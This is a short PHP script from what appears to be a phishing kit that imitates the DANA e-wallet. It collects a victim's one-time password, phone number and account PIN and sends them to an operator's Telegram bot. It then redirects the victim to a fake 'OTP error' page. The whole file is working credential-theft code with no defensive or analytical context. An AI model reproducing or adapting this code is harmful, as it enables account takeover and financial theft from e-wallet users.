<?php
session_start();
include "./../telegram.php";

$otp1 = $_POST['otp1'];
$otp2 = $_POST['otp2'];
$otp3 = $_POST['otp3'];
$otp4 = $_POST['otp4'];
$_otp = $otp1.$otp2.$otp3.$otp4;
$phone_number        = $_SESSION['phoneNumber'];
$_pin                = $_SESSION['acc_pin'];

$message = "
──────────────────────
MR-GHELE DANA | OTP | ".$phone_number."
──────────────────────
• No HP : ".$phone_number."
• PIN AKUN : ".$_pin."
• OTP : ".$_otp."
──────────────────────";

include "./function.php";

sendMessage($telegram_id, $message, $id_bot);
header('Location: ./../../dana_otp_eror/');
?>
